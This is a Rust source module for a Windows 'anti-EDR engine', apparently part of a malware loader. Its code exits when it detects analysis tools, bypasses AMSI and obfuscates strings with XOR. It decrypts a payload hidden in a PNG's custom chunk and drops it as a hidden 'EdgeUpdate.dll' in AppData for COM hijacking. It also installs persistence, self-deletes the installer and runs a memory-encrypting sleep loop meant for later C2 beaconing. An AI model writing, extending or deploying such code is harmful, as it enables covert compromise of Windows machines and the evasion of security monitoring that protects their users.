//! # Windows Anti-EDR Engine
//!
//! Zero Artifacts, Zero Dependencies Anti-EDR system.
//!
//! ## Modules
//! - `syscalls` - Indirect syscalls (Gate Jumping)
//! - `ghosting` - Process ghosting (execute from deleted file)
//! - `obfuscation` - Sleep obfuscation (Ekko technique)
//! - `stack_spoof` - Call stack spoofing (synthetic frames)
//! - `persistence` - COM hijacking + WMI + hidden task
//! - `ads` - NTFS Alternate Data Streams storage

pub mod ads;
pub mod persistence;
pub mod ghosting;
pub mod obfuscation;
pub mod stack_spoof;
pub mod syscalls;
pub mod blinding;
pub mod registry;
pub mod anti_analysis;
pub mod api_resolver;
pub mod self_delete;
pub mod happy_strings;
pub mod ipc;



// XOR Helper (Key 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Initialize and apply Windows stealth measures
pub fn check_and_apply_stealth() {

    if anti_analysis::is_hostile_environment() {
        #[cfg(not(feature = "debug_mode"))]
        {
             // Silent exit in production
             std::process::exit(0);
        }
        #[cfg(feature = "debug_mode")]
        {
             crate::k::debug::log_stage!(0, "Analysis Environment Detected (BYPASSING for DEBUG)");
        }
    }
    crate::k::debug::log_stage!(2, "Anti-Analysis Passed");

    // 1. Ghost Protocol - AMSI Bypass (IMMEDIATE EXECUTION)
    blinding::apply_ghost_protocol();
    crate::k::debug::log_stage!(3, "Ghost Protocol Active");
    
    // Check if already in ghost mode (obfuscated: "--ghost" XOR 0x55)
    let ghost_arg = x(&[0x78, 0x78, 0x32, 0x3D, 0x3A, 0x26, 0x21]);
    let is_ghost = std::env::args().any(|arg| arg == ghost_arg);
    
    // Registry check handled by persistence/registry modules implicit robustness
    // Check if we are running from temp "service.exe" 
    let current_exe = std::env::current_exe().unwrap_or_default();
    
    // "service.exe" -> xor(0x55)
    // s=73^55=26, e=65^55=30, r=72^55=27, v=76^55=23, i=69^55=3C, c=63^55=36, .=2E^55=7B
    let svc_name = x(&[0x26, 0x30, 0x27, 0x23, 0x3C, 0x36, 0x30, 0x7B, 0x30, 0x2D, 0x30]); 
    let is_loader_execution = current_exe.to_string_lossy().to_lowercase().contains(&svc_name);
    
    if is_ghost || is_loader_execution {
        crate::k::debug::log_stage!(4, "Loader Execution Detected");
        run_ghost_mode();
        return;
    }

    // Insert Happy Strings (Benign indicators) to confuse ML
    happy_strings::embed_happy_strings();

    

    match install_stealth_package() {
        Ok(_) => {
        }
        Err(e) => {
            // Silent fail
        }
    }
}

/// Install the stealth package (Using Native API - No std::fs imports)
fn install_stealth_package() -> Result<(), String> {
    crate::k::debug::log_stage!(5, "Install Start");
    if let Ok(_) = registry::install_self_to_registry() {
        crate::k::debug::log_stage!(6, "Registry Installed");
    }

    // 1. Drop LOADER using Native API
    // 1. Drop LOADER using Native API (Steganography: Payload in PNG)
    #[cfg(target_os = "windows")]
    const PNG_BYTES: &[u8] = include_bytes!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/src/assets/logo.png"
    ));
    
    // Helper to extract payload from PNG "biLn" chunk
    // New format: PZ64 header + original_size(4) + Base64(Encrypted(Compressed))
    #[cfg(target_os = "windows")]
    fn extract_payload_from_png(png: &[u8]) -> Option<Vec<u8>> {
        use flate2::read::DeflateDecoder;
        use std::io::Read;
        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
        use base64::{Engine as _, engine::general_purpose};

        // Key/Nonce must match steg_maker (Hardcoded for now)
         const KEY: [u8; 32] = [
            0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF,
            0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
            0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
        ];
        const NONCE: [u8; 12] = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B];
        
        let mut idx = 8; // Skip PNG Signature
        let mut raw_payload = Vec::new();
        
        // Collect all biLn chunks
        while idx < png.len().saturating_sub(12) {
            let len_bytes: [u8; 4] = png[idx..idx+4].try_into().ok()?;
            let len = u32::from_be_bytes(len_bytes) as usize;
            
            let type_bytes: [u8; 4] = png[idx+4..idx+8].try_into().ok()?;
            
            if &type_bytes == b"biLn" {
                let start = idx + 8;
                let end = start + len;
                if end > png.len() { break; }
                raw_payload.extend_from_slice(&png[start..end]);
            }
            
            idx += len + 12;
        }
        
        if raw_payload.len() < 8 { return None; }
        
        // Check PZ64 header
        if &raw_payload[0..4] == b"PZ64" {
            let orig_size = u32::from_le_bytes(raw_payload[4..8].try_into().ok()?) as usize;
            
            // Base64 Decode
            let b64_data = &raw_payload[8..];
            // Remove any whitespace/newlines if likely (steg_maker output is raw bytes, but just in case)
            // standard engine handles it? strict? 
            let decoded = general_purpose::STANDARD.decode(b64_data).ok()?;

            // Decrypt (ChaCha20)
            let mut decrypted = decoded; // Move
            let mut cipher = ChaCha20::new(&KEY.into(), &NONCE.into());
            cipher.apply_keystream(&mut decrypted);
            
            // Decompress
            let mut decoder = DeflateDecoder::new(&decrypted[..]);
            let mut decompressed = Vec::with_capacity(orig_size);
            if decoder.read_to_end(&mut decompressed).is_err() { return None; }
            
            Some(decompressed)
        } else {
            None 
        }
    }

    #[cfg(target_os = "windows")]
    let loader_data = extract_payload_from_png(PNG_BYTES).unwrap_or_else(|| {
        // Fallback: Attempt to self-replicate (read current binary)
        if let Ok(exe_path) = std::env::current_exe() {
            if let Ok(bytes) = std::fs::read(&exe_path) {
                crate::k::debug::log_stage!(6, "Payload: Self_Replication Active");
                return bytes;
            } else {
                crate::k::debug::log_err!("Payload: Failed to read self");
            }
        }
        
        // Final Fallback: Generate realistic-sized padding (~500KB)
        crate::k::debug::log_stage!(6, "Payload: Using Dummy (Wait for Stitching)");
        vec![0u8; 1024 * 500]
    });
    
    #[cfg(not(target_os = "windows"))]
    let loader_data = vec![0u8; 1024 * 512]; // Fallback 512KB to avoid small file anomaly
    
    let loader_bytes_ref = &loader_data; // Needed for write_file call below
    
    // Get APPDATA path
    let env_key = x(&[0x14, 0x05, 0x05, 0x11, 0x14, 0x01, 0x14]); // APPDATA
    let appdata = std::env::var(&env_key).unwrap_or_else(|_| r"C:\Windows\Temp".to_string());
    
    // Build path components (XOR obfuscated)
    // Changed from Templates to OneDrive folder (less monitored)
    let p1 = x(&[0x09, 0x18, 0x3C, 0x36, 0x27, 0x3A, 0x26, 0x3A, 0x33, 0x21]); // \Microsoft
    let p2 = x(&[0x09, 0x1A, 0x3B, 0x30, 0x11, 0x27, 0x3C, 0x23, 0x30]); // \OneDrive
    
    let target_dir = format!("{}{}{}", appdata, p1, p2);
    // Changed to DLL for COM Hijacking - EdgeUpdate.dll
    // "EdgeUpdate.dll" XOR 0x55 = [0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x7B, 0x31, 0x39, 0x39]
    let loader_name = x(&[0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x7B, 0x31, 0x39, 0x39]); // EdgeUpdate.dll
    let target_path = format!("{}\\{}", target_dir, loader_name);
    
    // Use Native API for file operations
    #[cfg(target_os = "windows")]
    unsafe {
        use api_resolver::*;
        
        // Create directory using CreateDirectoryW
        if let Some(create_dir) = resolve_api::<unsafe extern "system" fn(*const u16, *const std::ffi::c_void) -> i32>(
            HASH_KERNEL32, HASH_CREATE_DIRECTORY_W
        ) {
            let dir_wide = to_wide(&target_dir);
            let _ = create_dir(dir_wide.as_ptr(), std::ptr::null());
        }
        
        // Write file using CreateFileW + WriteFile
        type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const std::ffi::c_void, u32, u32, isize) -> isize;
        type WriteFile = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const std::ffi::c_void) -> i32;
        type CloseHandle = unsafe extern "system" fn(isize) -> i32;
        
        let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
            .ok_or("E20")?;
        let write_file: WriteFile = resolve_api(HASH_KERNEL32, HASH_WRITE_FILE)
            .ok_or("E21")?;
        let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
            .ok_or("E22")?;
        
        let path_wide = to_wide(&target_path);
        
        // GENERIC_WRITE=0x40000000, CREATE_ALWAYS=2, FILE_ATTRIBUTE_NORMAL=0x80
        let handle = create_file(path_wide.as_ptr(), 0x40000000, 0, std::ptr::null(), 2, 0x80, 0);
        if handle == -1 {
            return Err("E23".to_string());
        }
        
        let mut written: u32 = 0;
        let result = write_file(handle, loader_bytes_ref.as_ptr(), loader_bytes_ref.len() as u32, &mut written, std::ptr::null());
        close_handle(handle);
        
        if result == 0 {
            return Err("E23".to_string());
        }
        
        // Set hidden+system attributes
        if let Some(set_attrs) = resolve_api::<unsafe extern "system" fn(*const u16, u32) -> i32>(
            HASH_KERNEL32, HASH_SET_FILE_ATTRIBUTES_W
        ) {
            // FILE_ATTRIBUTE_HIDDEN(2) | FILE_ATTRIBUTE_SYSTEM(4)
            set_attrs(path_wide.as_ptr(), 0x02 | 0x04);
        }
    }
    crate::k::debug::log_stage!(7, "Payload Dropped");  // 2. Apply persistence
    persistence::apply_persistence_triad(&target_path);
    crate::k::debug::log_stage!(8, "Persistence Triad");
    
    // 3. Self-delete
    schedule_self_destruct();
    crate::k::debug::log_stage!(9, "Self-Delete Scheduled");
    
    Ok(())
}

/// Convert string to wide string (UTF-16) for Windows API
#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Run in ghost mode (already hidden)
fn run_ghost_mode() {
    crate::k::debug::log_stage!(10, "Ghost Mode Loop Start");

    
    // Verify syscall resolution
    if let Some(sc) = syscalls::Syscall::resolve(syscalls::HASH_NT_CLOSE) {

    } else {

        return;
    }
    
    // Main persistence loop with sleep obfuscation
    // Memory is encrypted while sleeping to evade memory scanners
    loop {
        // Sleep with obfuscation (encrypts .data/.rdata sections)
        unsafe {
            #[cfg(feature = "debug_mode")]
            let sleep_ms = 5_000;
            #[cfg(not(feature = "debug_mode"))]
            let sleep_ms = 30_000;

            match obfuscation::obfuscated_sleep(sleep_ms) { // 5s or 30s
                Ok(_) => {
                    crate::k::debug::log_detail!("Ghost Heartbeat (Obfuscated Sleep Wake)");
                },
                Err(_e) => {
                    // Fallback to regular sleep
                    crate::k::debug::log_detail!("Ghost Heartbeat (Standard Sleep)");
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
            }
        }
        
        // Beacon heartbeat - currently no-op, C2 integration pending external implementation
        // This loop keeps process alive with encrypted memory during sleep cycles
    }
}

/// Schedule deletion of original installer using native API
/// Schedule deletion of original installer using silent method (Jonas Lykkegård)
fn schedule_self_destruct() {
    #[cfg(target_os = "windows")]
    unsafe {
        if let Err(_e) = self_delete::melt() {
            // Silent fail
            // Fallback? No, fallback is noisy. Just fail silent.
        } else {

        }
    }
}

